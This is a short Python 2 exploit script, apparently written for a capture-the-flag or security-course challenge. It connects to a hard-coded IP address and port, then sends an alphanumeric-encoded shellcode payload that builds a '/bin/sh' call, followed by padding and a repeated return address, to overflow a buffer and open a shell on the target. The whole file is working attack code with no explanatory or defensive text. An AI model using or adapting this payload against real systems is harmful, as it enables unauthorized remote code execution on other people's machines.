__author__ = 'saipc'

import socket
import time
s = socket.create_connection(('129.219.253.30', 5083))

print s.recv(1000)

addr = '\xa9\x85\x04\x08'

s.send('\x6a\x30\x58\x34\x30\x50\x5a\x48\x66\x35\x41\x30\x66\x35\x73\x4f\x50\x52\x58\x684J4A\x68PSTY\x68UVWa\x68QRPT\x68PTXR\x68binH\x68IQ50\x68shDY\x68Rha0' + 'a'*64 + '\xa5\x31\x5a\x47\x55\x15\x50\x40' + addr*100 + '\n')

time.sleep(1)
print s.recv(1000)
